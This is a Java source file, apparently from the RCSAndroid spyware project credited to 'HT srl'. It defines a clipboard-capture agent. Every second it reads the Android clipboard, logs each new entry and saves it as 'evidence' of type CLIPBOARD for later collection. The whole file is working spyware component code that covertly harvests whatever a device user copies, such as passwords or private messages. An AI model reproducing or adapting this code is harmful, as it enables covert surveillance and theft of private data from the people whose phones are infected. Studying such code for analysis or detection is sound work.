/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.ArrayList;
import java.util.Date;

import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;
import com.ht.RCSAndroidGUI.util.WChar;

import android.content.Context;
import android.text.ClipboardManager;
import android.util.Log;

public class AgentClipboard extends AgentBase {
	private static final String TAG = "AgentClipboard";

	ClipboardManager clipboardManager;
	String lastClip = "";

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(1000);
		return true;
	}

	@Override
	public void go() {

		String ret = clipboardManager.getText().toString();
		if (ret != null && !ret.equals(lastClip)) {
			Log.d("QZ", TAG + " (go): captured " + ret);
			saveEvidence(ret);
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {
		
		final byte[] tm = (new DateTime()).getStructTm();
		byte[] payload = WChar.getBytes(ret.toString(), true);
		byte[] process = WChar.getBytes("", true);
		byte[] window = WChar.getBytes("", true);
		
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(payload);
		items.add(process);
		items.add(window);
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		LogR log = new LogR(EvidenceType.CLIPBOARD);
		log.write(items);
		log.close();

	}

	@Override
	public void begin() {
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		Check.ensures(clipboardManager != null, "Null clipboard manager");
	}

	@Override
	public void end() {
		clipboardManager = null;
	}

}
